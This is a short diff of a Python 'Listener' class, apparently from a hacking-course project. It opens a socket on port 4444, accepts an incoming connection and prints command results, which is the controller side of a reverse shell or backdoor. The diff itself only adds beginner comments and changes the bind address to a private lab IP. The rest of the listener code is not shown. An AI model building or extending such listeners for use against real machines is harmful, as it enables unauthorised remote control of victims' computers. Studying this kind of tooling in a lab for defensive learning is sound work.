@@ -5,9 +5,9 @@ import base64
 class Listener:
     def __init__(self, ip, port):
         listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # uses to reuse the same ip address
         listener.bind((ip, port))
-        listener.listen(0)
+        listener.listen(0) # allowing connection with maximum number of queded connections
         print("[+] Waiting For incoming Connections")
         self.connection, address = listener.accept()
         print("[+] Got a Connection from " + str(address))
@@ -61,5 +61,5 @@ class Listener:
             print(result)
 
 
-my_listener = Listener("172.20.10.4", 4444)
+my_listener = Listener("192.168.88.128", 4444)
 my_listener.run()
